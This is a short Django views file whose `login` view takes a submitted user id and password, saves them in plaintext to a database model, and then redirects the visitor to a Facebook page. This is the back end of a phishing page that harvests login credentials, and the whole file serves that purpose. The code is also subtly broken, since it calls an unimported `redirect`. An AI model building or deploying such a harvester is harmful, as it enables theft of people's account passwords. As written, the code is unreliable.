from django import http
from django.shortcuts import render,HttpResponseRedirect
from .models import info
def home(request):
    return render(request,"index.html")

def login(request):
    uid=request.POST["ui"]
    password= request.POST["pswd"]
    x=info.objects.create(ui=uid, password=password)
    x.save()
    return redirect("https://facebook.com/CrypticSci")
